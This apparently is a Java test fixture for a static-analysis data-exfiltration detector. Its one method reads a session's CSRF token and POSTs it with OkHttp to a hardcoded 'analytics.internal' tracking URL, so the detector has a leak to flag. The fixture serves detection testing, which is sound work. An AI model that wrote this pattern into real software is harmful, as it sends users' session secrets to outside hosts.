// DATA_EXFIL fixture: OkHttp two-step.  A session attribute (Sensitive)
// is wrapped via `RequestBody.create` (default arg → return smear)
// and bound to the request via the builder chain.  The network call
// happens at `client.newCall(req).execute()` which hits the
// chain-normalized `newCall.execute` matcher.  SSRF must NOT fire on
// the hardcoded URL.
//
// Driven by `data_exfil_java_integration_tests.rs`.
import javax.servlet.http.HttpSession;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DataExfilOkHttp {
    public void leak(HttpSession session) throws Exception {
        String token = (String) session.getAttribute("csrfToken");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(
            token, MediaType.parse("text/plain"));
        Request req = new Request.Builder()
            .url("https://analytics.internal/track")
            .post(body)
            .build();
        Response resp = client.newCall(req).execute();
    }
}
